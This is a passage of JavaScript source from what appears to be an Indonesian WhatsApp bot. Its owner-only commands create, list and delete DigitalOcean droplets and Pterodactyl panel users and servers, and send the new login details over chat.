return new Error('Gagal mendapatkan data akun digital ocean atau droplet!');
}
} catch (err) {
return err;
}}
async function sisadropletHandler() {
try {
if (!isCreator) return Reply(mess.owner)

const dropletInfo = await getDropletInfo();
m.reply(`Sisa droplet yang dapat kamu pakai: ${dropletInfo.remainingDroplets}

Total droplet terpakai: ${dropletInfo.totalDroplets}`);
} catch (err) {
reply(`Terjadi kesalahan: ${err}`);
}}
sisadropletHandler();
}
break

//================================================================================

case "sisadroplet-v2": {
if (!isCreator) return Reply(mess.owner)
async function getDropletInfo() {
try {
const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean2}`,
},
});

const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean2}`,
},
});

if (accountResponse.status === 200 && dropletsResponse.status === 200) {
const dropletLimit = accountResponse.data.account.droplet_limit;
const dropletsCount = dropletsResponse.data.droplets.length;
const remainingDroplets = dropletLimit - dropletsCount;

return {
dropletLimit,
remainingDroplets,
totalDroplets: dropletsCount,
};
} else {
return new Error('Gagal mendapatkan data akun digital ocean atau droplet!');
}
} catch (err) {
return err;
}}
async function sisadropletHandler() {
try {
if (!isCreator) return Reply(mess.owner)

const dropletInfo = await getDropletInfo();
m.reply(`Sisa droplet yang dapat kamu pakai: ${dropletInfo.remainingDroplets}

Total droplet terpakai: ${dropletInfo.totalDroplets}`);
} catch (err) {
reply(`Terjadi kesalahan: ${err}`);
}}
sisadropletHandler();
}
break

//================================================================================

case "deldroplet": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text
let deleteDroplet = async () => {
try {
let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'DELETE',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
}
});

if (response.ok) {
m.reply('Droplet berhasil dihapus!');
} else {
const errorData = await response.json();
return new Error(`Gagal menghapus droplet: ${errorData.message}`);
}
} catch (error) {
console.error('Terjadi kesalahan saat menghapus droplet:', error);
m.reply('Terjadi kesalahan saat menghapus droplet.');
}};
deleteDroplet();
}
break

//================================================================================

case "deldroplet-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("iddroplet"))
let dropletId = text
let deleteDroplet = async () => {
try {
let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'DELETE',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean2}`
}
});

if (response.ok) {
m.reply('Droplet berhasil dihapus!');
} else {
const errorData = await response.json();
return new Error(`Gagal menghapus droplet: ${errorData.message}`);
}
} catch (error) {
console.error('Terjadi kesalahan saat menghapus droplet:', error);
m.reply('Terjadi kesalahan saat menghapus droplet.');
}};
deleteDroplet();
}
break

//================================================================================
case "buatvps": {
    if (!isCreator) return Reply(mess.owner);
    if (!text) return m.reply(example("hostname size region image\nContoh: .buatvps rulzzofficial s-1vcpu-1gb sgp1 ubuntu-22-04-x64"))
    
    // Contoh : .buatvps rulzzofficial s-1vcpu-1gb sgp1 ubuntu-22-04-x64

    let args = text.split(" ");
    if (args.length < 4) return m.reply("Format salah! Contoh: buatvps serverku s-2vcpu-4gb sgp1 ubuntu-22-04-x64");

    let [hostname, size, region, image] = args;

    // Daftar ukuran VPS yang tersedia di DigitalOcean
    let availableSizes = ["s-1vcpu-1gb", "s-1vcpu-2gb", "s-2vcpu-2gb", "s-2vcpu-4gb", "s-4vcpu-8gb", "s-4vcpu-16gb"];
    if (!availableSizes.includes(size)) {
        return m.reply(`Size tidak valid! Pilih salah satu: ${availableSizes.join(", ")}`);
    }

    // Daftar region yang tersedia
    let availableRegions = ["sgp1", "nyc3", "ams3", "sfo3", "lon1", "fra1"];
    if (!availableRegions.includes(region)) {
        return m.reply(`Region tidak valid! Pilih salah satu: ${availableRegions.join(", ")}`);
    }

    // Daftar OS (image) yang tersedia
    let availableImages = ["ubuntu-20-04-x64", "ubuntu-22-04-x64", "debian-11-x64", "centos-8-x64"];
    if (!availableImages.includes(image)) {
        return m.reply(`Image tidak valid! Pilih salah satu: ${availableImages.join(", ")}`);
    }

    try {
        let dropletData = {
            name: hostname.toLowerCase(),
            region: region,
            size: size,
            image: image,
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        let password = await generateRandomPassword();
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apiDigitalOcean
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            await m.reply(`Memproses pembuatan VPS dengan spesifikasi:\n\nHostname: ${hostname}\nSize: ${size}\nRegion: ${region}\nOS: ${image}\n\nMohon tunggu...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apiDigitalOcean
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0
                ? dropletData.droplet.networks.v4[0].ip_address
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `✅ VPS Berhasil Dibuat!\n\n`;
            messageText += `🔹 ID: ${dropletId}\n`;
            messageText += `🔹 Hostname: ${hostname}\n`;
            messageText += `🔹 Size: ${size}\n`;
            messageText += `🔹 Region: ${region}\n`;
            messageText += `🔹 OS: ${image}\n`;
            messageText += `🔹 IP VPS: ${ipVPS}\n`;
            messageText += `🔹 Password: ${password}\n\n`;
            messageText += `Gunakan SSH untuk login: ssh root@${ipVPS}`;

            await Rulzz.sendMessage(m.chat, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        m.reply(`❌ Terjadi kesalahan saat membuat VPS: ${err.message}`);
    }
}
break

case "buatvps-v2": {
    if (!isCreator) return Reply(mess.owner);
    if (!text) return m.reply(example("hostname size region image\nContoh: .buatvps-v2 rulzzofficial s-1vcpu-1gb sgp1 ubuntu-22-04-x64"))
    
    // Contoh : .buatvps-v2 rulzzofficial s-1vcpu-1gb sgp1 ubuntu-22-04-x64

    let args = text.split(" ");
    if (args.length < 4) return m.reply("Format salah! Contoh: buatvps-v2 serverku s-2vcpu-4gb sgp1 ubuntu-22-04-x64");

    let [hostname, size, region, image] = args;

    // Daftar ukuran VPS yang tersedia di DigitalOcean
    let availableSizes = ["s-1vcpu-1gb", "s-1vcpu-2gb", "s-2vcpu-2gb", "s-2vcpu-4gb", "s-4vcpu-8gb", "s-4vcpu-16gb"];
    if (!availableSizes.includes(size)) {
        return m.reply(`Size tidak valid! Pilih salah satu: ${availableSizes.join(", ")}`);
    }

    // Daftar region yang tersedia
    let availableRegions = ["sgp1", "nyc3", "ams3", "sfo3", "lon1", "fra1"];
    if (!availableRegions.includes(region)) {
        return m.reply(`Region tidak valid! Pilih salah satu: ${availableRegions.join(", ")}`);
    }

    // Daftar OS (image) yang tersedia
    let availableImages = ["ubuntu-20-04-x64", "ubuntu-22-04-x64", "debian-11-x64", "centos-8-x64"];
    if (!availableImages.includes(image)) {
        return m.reply(`Image tidak valid! Pilih salah satu: ${availableImages.join(", ")}`);
    }

    try {
        let dropletData = {
            name: hostname.toLowerCase(),
            region: region,
            size: size,
            image: image,
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        let password = await generateRandomPassword();
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apiDigitalOcean2
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            await m.reply(`Memproses pembuatan VPS dengan spesifikasi:\n\nHostname: ${hostname}\nSize: ${size}\nRegion: ${region}\nOS: ${image}\n\nMohon tunggu...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apiDigitalOcean2
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0
                ? dropletData.droplet.networks.v4[0].ip_address
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `✅ VPS Berhasil Dibuat!\n\n`;
            messageText += `🔹 ID: ${dropletId}\n`;
            messageText += `🔹 Hostname: ${hostname}\n`;
            messageText += `🔹 Size: ${size}\n`;
            messageText += `🔹 Region: ${region}\n`;
            messageText += `🔹 OS: ${image}\n`;
            messageText += `🔹 IP VPS: ${ipVPS}\n`;
            messageText += `🔹 Password: ${password}\n\n`;
            messageText += `Gunakan SSH untuk login: ssh root@${ipVPS}`;

            await Rulzz.sendMessage(m.chat, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        m.reply(`❌ Terjadi kesalahan saat membuat VPS: ${err.message}`);
    }
}
break

//================================================================================

case "r1c1": case "r2c1": case "r2c2": case "r4c2": case "r8c4": case "r16c4": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("hostname"))
    await sleep(1000)
    let images
    let region = "sgp1"
    if (command == "r1c1") {
    images = "s-1vcpu-1gb"
    } else if (command == "r2c1") {
    images = "s-1vcpu-2gb"
    } else if (command == "r2c2") {
    images = "s-2vcpu-2gb"
    } else if (command == "r4c2") {
    images = "s-2vcpu-4gb"
    } else if (command == "r8c4") {
    images = 's-4vcpu-8gb'
    } else {
    images = "s-4vcpu-16gb-amd"
    region = "sgp1"
    }
    let hostname = text.toLowerCase()
    if (!hostname) return m.reply(example("hostname"))
    
    try {        
        let dropletData = {
            name: hostname,
            region: region, 
            size: images,
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        let password = await  generateRandomPassword()
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apiDigitalOcean 
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            await m.reply(`Memproses pembuatan vps...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apiDigitalOcean
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `VPS berhasil dibuat!\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}`;

            await Rulzz.sendMessage(m.chat, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        m.reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
    }
}
break

//================================================================================

case "1gb-v2": case "2gb-v2": case "3gb-v2": case "4gb-v2": case "5gb-v2": case "6gb-v2": case "7gb-v2": case "8gb-v2": case "9gb-v2": case "10gb-v2": case "unlimited-v2": case "unli-v2": {
if (!isOwner && !isSellerprivate) return m.reply(mess.sellerprivate)
if (!text) return m.reply(`*Contoh Penggunaan :*
*.1gb-v2* username
*.1gb-v2* username,628xxx`)
let nomor
let usernem
let tek = text.split(",")
if (tek.length > 1) {
let [users, nom] = text.split(",")
if (!users || !nom) return m.reply(`*Contoh Penggunaan :*
*.1gb-v2* username
*.1gb-v2* username,628xxx`)
nomor = nom.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
usernem = users.toLowerCase()
} else {
usernem = text.toLowerCase()
nomor = m.chat
}

var onWa = await Rulzz.onWhatsApp(nomor.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor target tidak terdaftar di whatsapp!")
var ram
var disknya
var cpu
if (command == "1gb-v2") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb-v2") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb-v2") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb-v2") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb-v2") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb-v2") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb-v2") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb-v2") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb-v2") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb-v2") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}

let username = usernem.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(3).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainV2 + `/api/application/nests/${nestid}/eggs/` + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(eggV2),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.chat !== nomor) {
orang = nomor
await m.reply(`Data panel sudah dikirim ke nomor ${nomor.split("@")[0]}`)
} else {
orang = m.chat
}
var teks = `
*Berikut Detail Akun Panel Kamu 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}
*🗓️ ${tanggal(Date.now())}*

*🌐 Spesifikasi Server*
* Ram : *${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}*
* Disk : *${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}*
* CPU : *${cpu == "0" ? "Unlimited" : cpu+"%"}*
* ${global.domainV2}

*Syarat & Ketentuan :*
* Expired panel 1 bulan
* Simpan data ini sebaik mungkin
* Garansi pembelian 15 hari (1x replace)
* Claim garansi wajib membawa bukti chat pembelian
`
await Rulzz.sendMessage(orang, {text: teks}, {quoted: m})
}
break

//================================================================================

case "listadmin-v2": {
if (!isCreator) return Reply(mess.owner)
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await Rulzz.sendMessage(m.chat, {text: teks}, {quoted: m})
}
break

//================================================================================

case "listsrv-v2": case "listpanel-v2": case "listserver-v2": {
  if (!isCreator) return Reply(`mess.owner`)
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domainV2 + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikeyV2
    }
  });
  let res = await f.json();
  let servers = res.data;
  if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
  let sections = [];
  let messageText = "Berikut adalah daftar server:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikeyV2
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Nama Server: ${s.name}\n`;
    messageText += `Ram : ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}\n`;
    messageText += `CPU : ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}\n`;
    messageText += `Disk : ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}\n`;
    messageText += `Created : ${s.created_at.split("T")[0]}\n`;
    messageText += `Status: ${status}\n\n`
  }
  messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await Rulzz.sendMessage(m.chat, { text: messageText }, { quoted: qtext });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    m.reply(`Gunakan perintah ${prefix+command} ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break

//================================================================================

case "deladmin-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domainV2 + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//================================================================================

case "delpanel-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("idnya"))
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domainV2 + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domainV2 + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

//================================================================================

case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
if (!isOwner && !isPremium) return m.reply(mess.seller)
if (!text) return m.reply(`*Contoh Penggunaan :*
*.1gb* username
*.1gb* username,628xxx`)
let nomor
let usernem
let tek = text.split(",")
if (tek.length > 1) {
let [users, nom] = text.split(",")
if (!users || !nom) return m.reply(`*Contoh Penggunaan :*
*.1gb* username
*.1gb* username,628xxx`)
nomor = nom.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
usernem = users.toLowerCase()
} else {
usernem = text.toLowerCase()
nomor = m.chat
}

var onWa = await Rulzz.onWhatsApp(nomor.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor target tidak terdaftar di whatsapp!")
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}

let username = usernem.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(3).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.chat !== nomor) {
orang = nomor
await m.reply(`Data akun panelnya sudah dikirim ke nomor ${nomor.split("@")[0]}`)
} else {
orang = m.chat
}
var teks = `
*Berikut Detail Akun Panel Kamu 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}
*🗓️ ${tanggal(Date.now())}*

*🌐 Spesifikasi Server*
* Ram : *${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}*
* Disk : *${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}*
* CPU : *${cpu == "0" ? "Unlimited" : cpu+"%"}*
* ${global.domain}

*Syarat & Ketentuan :*
* Expired panel 1 bulan
* Simpan data ini sebaik mungkin
* Garansi pembelian 15 hari (1x replace)
* Claim garansi wajib membawa bukti chat pembelian
`
await Rulzz.sendMessage(orang, {text: teks}, {quoted: m})
}
break

//================================================================================

case "listadmin": {
if (!isCreator) return Reply(mess.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await Rulzz.sendMessage(m.chat, {text: teks}, {quoted: m})
}
break

//================================================================================
case "listsrv": case "listpanel": case "listserver": {
  if (!isCreator) return Reply(`mess.owner`)
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let servers = res.data;
  if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
  let sections = [];
  let messageText = "Berikut adalah daftar server:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikey
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Nama Server: ${s.name}\n`;
    messageText += `Ram : ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}\n`;
    messageText += `CPU : ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}\n`;
    messageText += `Disk : ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}\n`;
    messageText += `Created : ${s.created_at.split("T")[0]}\n`;
    messageText += `Status: ${status}\n\n`
  }
  messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await Rulzz.sendMessage(m.chat, { text: messageText }, { quoted: qtext });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    m.reply(`Gunakan perintah ${prefix}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break

case "addserver": case "addsrv": {
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply(example(`name|tanggal|userId|eggId|locationId|memory/disk|cpu\nContoh : ${prefix+command} Rulzz Server|Panel By Rulzz OfficiaL|1|15|1|0/0|0`))
let s = text.split('|');
if (s.length < 7) return m.reply(`*Format Salah*\nContoh: ${prefix + command} name|deskripsi|userId|eggId|locationId|memory/disk|cpu`)
let name = s[0];
let desc = s[1];
let usr_id = s[2];
let egg = s[3];
let loc = s[4];
let memo_disk = s[5].split`/`;
let cpu = s[6];
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data = await f1.json();
let startup_cmd = data.attributes.startup

let f = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
